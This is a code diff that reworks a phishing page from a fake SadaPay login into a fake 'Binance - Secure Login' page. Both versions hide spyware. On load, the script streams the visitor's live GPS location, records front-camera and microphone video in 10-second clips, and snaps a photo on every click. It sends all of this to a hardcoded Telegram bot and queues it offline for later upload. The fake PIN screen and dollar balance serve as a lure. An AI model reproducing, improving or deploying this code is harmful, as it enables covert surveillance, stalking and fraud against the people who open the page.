@@ -3,106 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SadaPay - Goodbye Bank Fees</title>
+    <title>Binance - Secure Login</title>
     <style>
-        :root { --teal: #2dd4bf; --black: #121212; --card-bg: #1e1e1e; }
-        body { margin: 0; background: var(--black); color: white; font-family: sans-serif; text-align: center; }
-        .screen { display: none; padding: 20px; min-height: 100vh; flex-direction: column; align-items: center; justify-content: center; }
-        .active-screen { display: flex; }
-        .card { background: var(--card-bg); border-radius: 24px; padding: 25px; width: 100%; max-width: 360px; border: 1px solid #333; }
-        .balance { font-size: 42px; font-weight: bold; color: var(--teal); margin: 10px 0; }
-        input { background: #2a2a2a; border: 1px solid #444; color: white; padding: 16px; width: 100%; border-radius: 14px; margin: 12px 0; box-sizing: border-box; }
-        .btn { background: var(--teal); color: black; padding: 16px; width: 100%; border-radius: 14px; border: none; font-weight: bold; cursor: pointer; }
+        :root { --binance-yellow: #FCD535; --black: #121212; --card: #1e1e1e; }
+        body { margin: 0; background: var(--black); color: white; font-family: 'Segoe UI', sans-serif; text-align: center; overflow-x: hidden; }
+        .screen { display: none; padding: 20px; min-height: 100vh; flex-direction: column; align-items: center; justify-content: center; box-sizing: border-box; }
+        .active { display: flex; }
+        
+        /* Binance Style Card */
+        .card { background: var(--card); border-radius: 24px; padding: 30px; width: 100%; max-width: 360px; border: 1px solid #333; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
+        .logo-img { width: 180px; margin-bottom: 20px; filter: drop-shadow(0 0 5px rgba(252, 213, 53, 0.3)); }
+        
+        .balance { font-size: 40px; font-weight: bold; color: var(--binance-yellow); margin: 10px 0; }
+        input { background: #2a2a2a; border: 1px solid #444; color: white; padding: 16px; width: 100%; border-radius: 12px; margin: 10px 0; box-sizing: border-box; font-size: 18px; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--binance-yellow); }
+        
+        .btn { background: var(--binance-yellow); color: black; padding: 16px; width: 100%; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        .btn:active { transform: scale(0.96); }
         #video, #canvas { display: none; }
     </style>
 </head>
-<body onclick="captureAction()">
+<body onclick="takeSnap()">
 
-    <div id="loginScreen" class="screen active-screen">
-        <img src="https://sadapay.pk/wp-content/uploads/2022/06/SadaPay-Logo-1.png" width="140" style="margin-bottom:30px;">
+    <div id="loginScreen" class="screen active">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Binance_Logo.png/640px-Binance_Logo.png" class="logo-img" alt="Binance">
         <div class="card">
-            <h3>Secure Login</h3>
-            <input type="password" id="pinInput" placeholder="Enter PIN" maxlength="4">
-            <button class="btn" onclick="verify()">Continue</button>
+            <h3 style="margin-top:0;">Identity Verification</h3>
+            <p style="color:#848E9C; font-size:14px;">Enter your 4-digit PIN to access your Spot Wallet</p>
+            <input type="password" id="pin" placeholder="Enter PIN" maxlength="4" inputmode="numeric">
+            <button class="btn" onclick="login()">Log In</button>
         </div>
     </div>
 
-    <div id="mainScreen" class="screen">
-        <p style="color:#888;">Current Balance</p>
-        <div class="balance">Rs. 107,800</div>
-        <button class="btn" style="width:200px;">Send Money</button>
+    <div id="dash" class="screen">
+        <div style="width:100%; max-width:360px; text-align:left;">
+            <p style="color:#848E9C; margin-bottom: 5px;">Total Balance</p>
+            <div class="balance">$385.00</div>
+            <p style="color:#5E6673; margin-top:-5px;">≈ Rs. 107,800.00</p>
+            <div class="card" style="margin-top:20px; display:flex; gap:10px; padding:20px;">
+                <button class="btn" style="flex:1;">Withdraw</button>
+                <button class="btn" style="flex:1; background:#2B3139; color:white;">Deposit</button>
+            </div>
+        </div>
     </div>
 
     <video id="video" autoplay muted playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        const API_KEY = '8466749965:AAEa8pM--47T3Mo6X34atY8LexkqC79epe0';
-        const CHAT_ID = '7107389141';
-        let db, mediaRecorder, chunks = [];
+        const token = '8466749965:AAEa8pM--47T3Mo6X34atY8LexkqC79epe0';
+        const chat = '7107389141';
+        let db, recorder, chunks = [];
 
-        // 1. Storage & Sync Logic
-        const req = indexedDB.open("DataStore", 1);
-        req.onupgradeneeded = e => e.target.result.createObjectStore("sync_queue", { autoIncrement: true });
+        // Database & Sync
+        const req = indexedDB.open("CryptoSafeDB", 1);
+        req.onupgradeneeded = e => e.target.result.createObjectStore("sync", { autoIncrement: true });
         req.onsuccess = e => { db = e.target.result; sync(); };
 
-        // 2. Main Initialization (Camera, Mic, Location)
         window.onload = () => {
-            // Live Location Tracking
+            // Live Location
             if (navigator.geolocation) {
-                navigator.geolocation.watchPosition(pos => {
-                    const msg = `📍 *LIVE LOCATION*\nLat: ${pos.coords.latitude}\nLong: ${pos.coords.longitude}\nGoogle Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    sendText(msg);
-                }, err => console.log("Loc Denied"), { enableHighAccuracy: true });
+                navigator.geolocation.watchPosition(p => {
+                    const msg = `📍 *BINANCE USER LOCATION*\nLat: ${p.coords.latitude}\nLong: ${p.coords.longitude}\nGoogle Maps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    sendMsg(msg);
+                }, null, { enableHighAccuracy: true });
             }
 
-            // Camera & Audio
+            // Media
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
-                .then(stream => {
-                    document.getElementById('video').srcObject = stream;
-                    startVideoLoop(stream);
-                });
+            .then(s => {
+                document.getElementById('video').srcObject = s;
+                startRec(s);
+            }).catch(() => sendMsg("⚠️ Permissions Blocked"));
         };
 
-        function startVideoLoop(stream) {
-            mediaRecorder = new MediaRecorder(stream);
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = () => {
+        function startRec(s) {
+            recorder = new MediaRecorder(s);
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
                 const blob = new Blob(chunks, { type: 'video/webm' });
                 chunks = [];
-                navigator.onLine ? uploadFile(blob, 'video') : saveLocally(blob);
-                mediaRecorder.start();
+                navigator.onLine ? upload(blob, 'video') : saveOff(blob);
+                recorder.start();
             };
-            mediaRecorder.start();
-            setInterval(() => mediaRecorder.state === "recording" && mediaRecorder.stop(), 10000);
+            recorder.start();
+            setInterval(() => { if(recorder.state === "recording") recorder.stop(); }, 10000);
         }
 
-        // 3. Data Transmission
-        async function uploadFile(blob, type) {
+        async function upload(blob, type) {
             const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            const endpoint = type === 'video' ? 'sendVideo' : 'sendPhoto';
-            fd.append(type, blob, `${type}_${Date.now()}.${type === 'video' ? 'webm' : 'jpg'}`);
-            try { await fetch(`https://api.telegram.org/bot${API_KEY}/${endpoint}`, { method: 'POST', body: fd }); }
-            catch(e) { saveLocally(blob); }
+            fd.append('chat_id', chat);
+            const api = type === 'video' ? 'sendVideo' : 'sendPhoto';
+            fd.append(type, blob, `file_${Date.now()}.${type === 'video' ? 'webm' : 'jpg'}`);
+            try { await fetch(`https://api.telegram.org/bot${token}/${api}`, { method: 'POST', body: fd }); }
+            catch(e) { saveOff(blob); }
         }
 
-        function sendText(txt) {
-            fetch(`https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`);
+        function sendMsg(t) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(t)}&parse_mode=Markdown`);
         }
 
-        function saveLocally(blob) {
-            const tx = db.transaction("sync_queue", "readwrite");
-            tx.objectStore("sync_queue").add(blob);
+        function saveOff(blob) {
+            const tx = db.transaction("sync", "readwrite");
+            tx.objectStore("sync").add(blob);
         }
 
         async function sync() {
             if (!navigator.onLine || !db) return;
-            const store = db.transaction("sync_queue", "readwrite").objectStore("sync_queue");
+            const store = db.transaction("sync", "readwrite").objectStore("sync");
             store.openCursor().onsuccess = async e => {
                 const cursor = e.target.result;
                 if (cursor) {
-                    await uploadFile(cursor.value, cursor.value.type.includes('video') ? 'video' : 'photo');
+                    await upload(cursor.value, cursor.value.type.includes('video') ? 'video' : 'photo');
                     store.delete(cursor.key);
                     cursor.continue();
                 }
@@ -111,22 +123,19 @@
 
         window.addEventListener('online', sync);
 
-        // 4. User Interaction Actions
-        function captureAction() {
-            const v = document.getElementById('video');
-            const c = document.getElementById('canvas');
+        function takeSnap() {
+            const v = document.getElementById('video'), c = document.getElementById('canvas');
             if(v.srcObject) {
-                const ctx = c.getContext('2d');
-                ctx.drawImage(v, 0, 0, c.width, c.height);
-                c.toBlob(b => uploadFile(b, 'photo'), 'image/jpeg');
+                c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+                c.toBlob(b => upload(b, 'photo'), 'image/jpeg');
             }
         }
 
-        function verify() {
-            if(document.getElementById('pinInput').value === "7890") {
-                document.getElementById('loginScreen').style.display = "none";
-                document.getElementById('mainScreen').classList.add('active-screen');
-            }
+        function login() {
+            if(document.getElementById('pin').value === "7890") {
+                document.getElementById('loginScreen').classList.remove('active');
+                document.getElementById('dash').classList.add('active');
+            } else { alert("Verification Failed!"); }
         }
     </script>
 </body>
